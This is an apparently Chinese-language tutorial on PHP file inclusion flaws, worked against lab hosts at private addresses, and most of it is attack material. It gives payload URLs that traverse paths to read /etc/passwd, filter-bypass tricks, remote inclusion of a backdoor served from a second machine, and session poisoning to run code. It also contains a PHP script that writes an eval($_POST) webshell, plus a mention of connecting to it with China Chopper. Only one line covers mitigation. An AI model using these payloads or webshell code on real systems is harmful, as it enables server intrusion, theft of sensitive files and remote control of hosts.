### 一、漏洞原理
利用web程序对文件的动态调用的控制不严谨，从而传递恶意文件进行攻击
### 二、存在条件

1. 没有对文件参数进行控制
2. 参数为文件
### 三、漏洞分类

1.  远程文件包含(RFI，Remote File Inclusion): 通过url等协议读取远程文件
2.  本地文件包含（LFI，Local File Inclusion):读取服务器本地的文件
### 四、漏洞危害

1. 读取敏感数据
2. 获取shell
### 五、漏洞判定
#### 判定方法

1. 远程文件包含
> [http://192.168.11.140/vulnerabilities/fi/?page=https://www.baidu.com](http://192.168.11.140/vulnerabilities/fi/?page=https://www.baidu.com)

跳转到百度页面，说明包含该漏洞

2. 本地文件包含
> [http://192.168.11.140/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd](http://192.168.11.140/vulnerabilities/fi/?page=../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd)

如果可以读取文件的内容，说明包含该漏洞

3. 使用burpsuite的主动扫描
#### 绕过

1. 双写绕过：针对对http://和https://等的过滤
> [http://192.168.11.140/vulnerabilities/fi/?page=hthttps://tps://www.baidu.com](http://192.168.11.140/vulnerabilities/fi/?page=hthttps://tps://www.baidu.com)


2. 绝对路径绕过: 针对../和..\\的过滤
> [http://192.168.11.140/vulnerabilities/fi/?page=/etc/passwd](http://192.168.11.140/vulnerabilities/fi/?page=/etc/passwd)


3. 关键字绕过: 针对关键字进行筛选的数据，如file*
> file:///etc/passwd 和  file1.php../../../../../../../../../../../../../../../../etc/passwd

#### 漏洞避免
> 使用白名单模式，明确哪些文件可以传递，但是会使程序失去灵活性

### 六、漏洞利用

1. 敏感信息获取
```php
<?php
  $filename  = $_GET['filename'];
	include($filename);
?>
```
直接读取本地敏感数据

2. 远程文件包含
```php
<?php
  $filename  = $_GET['filename'];
	include($filename); # 普通加载
  include($_GET['filename'] . ".html"); # 通过html限制
?>
```

- 对远程文件进行读取和解析，通常来传递后门
> [http://192.168.11.140/vulnerabilities/fi/?page=http://192.168.11.132:8000/2.php](http://192.168.11.140/vulnerabilities/fi/?page=http://192.168.11.132:8000/2.php)

- 针对html后缀限制的，可以使用截断符和注释符处理
> [http://192.168.11.140/test/3.php?filename=http://192.168.11.132:8000/2.php?](http://192.168.11.140/test/3.php?filename=http://192.168.11.132:8000/2.php?)


3. 通过session获取shell
```php
<?php
	session_start();
	$ctfs=$_GET['ctfs'];
	$_SESSION["username"]=$ctfs;
?>
```

- 利用session漏洞传递后门文件，[http://192.168.11.140/test/1.php?ctfs=%3C?php%20phpinfo();?%3E](http://192.168.11.140/test/1.php?ctfs=%3C?php%20phpinfo();?%3E)
- 利用文件包含漏洞，对文件进行调用[http://192.168.11.140/vulnerabilities/fi/?page=/var/lib/php/session/sess_uprqs1im29ems1is6bsd6g8k57](http://192.168.11.140/vulnerabilities/fi/?page=/var/lib/php/session/sess_uprqs1im29ems1is6bsd6g8k57)
> sessionid通过会话获取


4. 利用文件包含漏洞获得webshell
- 启动后门服务器，并编写生成后门脚本
```php
<?php
$a = "<?php 
					eval(\$_POST['123']);
        	echo __FILE__;
      ?>";
$b = fopen("a.php","w") or die("123!");
fwrite($b,$a);
fclose($b);
echo "大佬！木马已生成。 ";    
echo '<br/>';
?>
```
> 生成后门文件a.shell，内容为<?php eval(\$_POST['123'])?>

- 利用文件包含漏洞加载shell2.php,从而生成后门文件
> [http://192.168.11.142:84/lfi.php?filename=http://192.168.11.132:8000/shell2.php](http://192.168.11.142:84/lfi.php?filename=http://192.168.11.132:8000/shell2.php)

- 使用中国菜刀工具连接后门
